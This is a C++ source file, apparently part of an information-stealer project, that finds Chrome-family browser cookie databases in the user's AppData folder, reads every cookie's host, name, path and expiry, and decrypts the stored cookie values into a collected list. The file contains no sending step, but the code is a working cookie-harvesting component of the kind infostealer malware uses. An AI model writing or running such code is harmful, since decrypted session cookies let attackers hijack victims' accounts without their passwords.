#include "../includes/ChromeCookiesCollecter.h"

#include <memory>
#include "../includes/sqlite3.h"
#include "../includes/Base64.h"





List<CookieData> ChromeCookiesCollecter::collectData()
{
	for (const auto& browser : m_chromeList)
	{
		collectFromPath(browser);
	}

	return m_collectedData;
}
void ChromeCookiesCollecter::collectFromPath(const String& chromePath)
{
	if (!getDbPath(chromePath)) 
		return;

	sqlite3* db;

	if (sqlite3_open(m_chromeSqlitePath.c_str(), &db) != SQLITE_OK)
		return;


	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies", -1, &stmt, 0) != SQLITE_OK)
		return;

	if (!m_decryptor.initDecryptor(chromePath))
		return;
	//go over the db and fill the inforamtion by row
	while (sqlite3_step(stmt) == SQLITE_ROW)
	{
		CookieData data;

		char* host_key = (char*)sqlite3_column_text(stmt, 0);
		char* name = (char*)sqlite3_column_text(stmt, 1);
		char* path = (char*)sqlite3_column_text(stmt, 2);
		char* encryptedCookie = (char*)sqlite3_column_text(stmt, 3);
		char* expiresUtc = (char*)sqlite3_column_text(stmt, 4);
		
		//break if we are done
		if (host_key == nullptr && name == nullptr && path == nullptr
			&& encryptedCookie ==nullptr && expiresUtc == nullptr)
			break;

		if ((strlen(host_key) == 0) && (strlen(name) == 0) && (strlen(path) == 0)
			 && (strlen(encryptedCookie) == 0) && (strlen(expiresUtc) == 0))
			continue;

		//fill inforamtion
		data.hostKey = host_key;
		data.name = name;
		data.path = path;
		data.expireUTC= expiresUtc;
		
		String decCookie;
		//decrypt cookie
		if (m_decryptor.decrypt(encryptedCookie, decCookie, sqlite3_column_bytes(stmt, 3)))
			data.value = decCookie;

		m_collectedData.emplace_back(data);
	}

}


bool ChromeCookiesCollecter::getDbPath(const String& chromePath)
{
	const int localData = 0x001c;
	std::string path = m_decryptor.getAppFolder(localData);
	if (path.empty())
		return false;
	m_chromeSqlitePath = path;
	m_chromeSqlitePath += chromePath + R"(\User Data\Default\Cookies)";
	return true;
}




